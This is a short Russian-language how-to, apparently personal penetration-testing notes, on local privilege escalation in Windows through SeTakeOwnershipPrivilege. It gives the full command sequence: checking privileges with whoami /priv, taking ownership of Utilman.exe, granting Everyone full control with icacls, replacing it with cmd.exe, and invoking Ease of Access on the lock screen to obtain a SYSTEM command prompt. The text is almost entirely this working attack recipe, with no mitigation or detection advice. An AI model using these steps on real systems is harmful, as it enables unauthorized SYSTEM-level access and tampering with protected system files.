# Уязвимость заключается в том, что привелегия SeTakeOwnershipPrivilege может сделать юзера владельцам любого объекта в системе.

1. Проверяем привелегии юзера:
C:\Windows\system32>whoami /priv

* Вывод:
Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled <----Нужная привелегия
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled

2. Используем приложение, запущенное с SYSTEM привелегиями, например Utilman.exe и становимся владельцем файла:

takeown /f C:\Windows\System32\Utilman.exe

3. Предоставляем полные права доступа на файл:
icacls C:\Windows\System32\Utilman.exe /grant Everyone:F

4. Подменяем исполняемый файл сервиса на целевой машине:
copy cmd.exe Utilman.exe

5. Нажимаем lock в настройках аккаунта, а затем ease of access на заблокированном экране, 
и так как мы подменили utilman.exe у нас открывается командная строка с привелегиями SYSTEM.

